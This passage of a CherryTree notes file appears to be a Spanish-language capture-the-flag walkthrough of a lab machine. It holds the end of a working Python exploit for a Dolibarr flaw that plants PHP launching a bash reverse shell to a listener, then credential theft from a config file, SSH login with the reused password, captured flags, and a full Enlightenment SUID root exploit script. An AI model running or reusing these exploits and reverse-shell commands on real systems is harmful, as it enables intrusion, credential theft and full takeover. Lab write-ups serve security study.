        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"token\"\r\n\r\n" +
        login_token + "\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"backtopage\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"dol_openinpopup\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "updatesource\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"pageid\"\r\n\r\n"
        "2\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"update\"\r\n\r\n"
        "Save\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"PAGE_CONTENT_x\"\r\n\r\n"
        "16\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"PAGE_CONTENT_y\"\r\n\r\n"
        "2\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"PAGE_CONTENT\"\r\n\r\n"
        "&lt;!-- Enter here your HTML content. Add a section with an id tag and tag contenteditable=\"true\" if you want to use the inline editor for the content --&gt;\n"
        "&lt;section id=\"mysection1\" contenteditable=\"true\"&gt;\n"
        "    &lt;?pHp system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/" + lhost + "/" + lport + " 0&gt;&amp;1'\"); ?&gt;\n"
        "&lt;/section&gt;\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm--\r\n"
    )

    http_connection.request("POST", "/website/index.php", edit_page_body, edit_page_headers)
    http_connection.getresponse()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="---[Reverse Shell Exploit for Dolibarr &lt;= 17.0.0 (CVE-2023-30253)]---", usage= "python3 exploit.py &lt;TARGET_HOSTNAME&gt; &lt;USERNAME&gt; &lt;PASSWORD&gt; &lt;LHOST&gt; &lt;LPORT&gt;\r\nexample: python3 exploit.py http://example.com login password 127.0.0.1 9001")
    parser.add_argument("hostname", help="Target hostname")
    parser.add_argument("username", help="Username of Dolibarr ERP/CRM")
    parser.add_argument("password", help="Password of Dolibarr ERP/CRM")
    parser.add_argument("lhost", help="Listening host for reverse shell")
    parser.add_argument("lport", help="Listening port for reverse shell")

    args = parser.parse_args()
    min_required_args = 5
    if len(vars(args)) != min_required_args:
        parser.print_usage()
        exit()

    site_name = str(uuid.uuid4()).replace("-","")[:10]
    base_url = args.hostname + "/index.php"
    auth_url = args.hostname + "/index.php?mainmenu=home"
    admin_url = args.hostname + "/admin/index.php?mainmenu=home&amp;leftmenu=setup&amp;mesg=setupnotcomplete"
    call_reverse_shell_url = args.hostname + "/public/website/index.php?website=" + site_name + "&amp;pageref=" + site_name

    pre_login_token = get_csrf_token(base_url, auth_headers)

    if pre_login_token == "":
        print("[!] Cannot get pre_login_token, please check the URL") 
        exit()

    print("[*] Trying authentication...")
    print("[**] Login: " + args.username)
    print("[**] Password: " + args.password)

    auth(pre_login_token, args.username, args.password, auth_url, auth_headers)
    time.sleep(1)

    login_token = get_csrf_token(admin_url, auth_headers)

    if login_token == "":
        print("[!] Cannot get login_token, please check the URL") 
        exit()

    http_connection = http.client.HTTPConnection(remove_http_prefix(args.hostname))

    print("[*] Trying created site...")
    create_site(args.hostname, login_token, site_name, http_connection)
    time.sleep(1)

    print("[*] Trying created page...")
    create_page(args.hostname, login_token, site_name, http_connection)
    time.sleep(1)

    print("[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection")
    edit_page(args.hostname, login_token, site_name, args.lhost, args.lport, http_connection)

    http_connection.close()
    time.sleep(1)
    requests.get(call_reverse_shell_url)

    print("[!] If you have not received the shell, please check your login and password")</cell>
          </row>
          <row>
            <cell>Exploit para la version web  / POC exploit for Dolibarr &lt;= 17.0.0 (CVE-2023-30253)</cell>
            <cell>exploit</cell>
          </row>
        </table>
        <table char_offset="17" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>
  realizamos un analisis interno de los puertos
  
  netstat -ltunp | grep "LISTEN"
  
 tcp       0      53              LISTEN                       
tcp        0      33060         LISTEN                       
tcp        0      22                      LISTEN                       
tcp        0      3306            LISTEN                      
tcp6     0      80                                 LISTEN 
  
  -----------------------------</cell>
          </row>
        </table>
        <table char_offset="20" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>verificamos la base de datos con 

grep -r -i db_name /var 2&gt;/dev/null</cell>
          </row>
        </table>
        <table char_offset="24" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>/var/www/html/crm.board.htb/htdocs/conf/conf.php</cell>
          </row>
        </table>
        <table char_offset="27" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
</cell>
          </row>
        </table>
      </node>
      <node unique_id="13" master_id="0" name="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1723136605" ts_lastsave="1723136607">
        <rich_text>
vamos a ingresar por ssh

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
password
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

flag
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ejecutamos el siguiente comando para verificar los permisos suid

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

al verificar que tenemos permisos suid en varios archuvos vamos a ejecutar el siguiente exploit
cramos un archivo con nano dentro delsistema le pagamos el eploit y le damos permisos para ejecutarlo

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ya estando dentro como root 
nos vamos a root y validamos la flag de root
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <table char_offset="27" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>ssh larissa@10.10.11.11</cell>
          </row>
        </table>
        <table char_offset="38" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>serverfun2$2023!!</cell>
          </row>
        </table>
        <table char_offset="46" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>f1c7c16f0507cbc305f4a8c4c1484f06</cell>
          </row>
        </table>
        <table char_offset="115" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>find / -perm /u=s 2&gt;/dev/null</cell>
          </row>
        </table>
        <table char_offset="317" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh</cell>
          </row>
        </table>
        <table char_offset="319" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2&gt;/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" &gt; /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net</cell>
          </row>
        </table>
        <table char_offset="396" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>9106785611a0d4286911140c1d612f01</cell>
          </row>
        </table>
      </node>
    </node>
  </node>
</cherrytree>
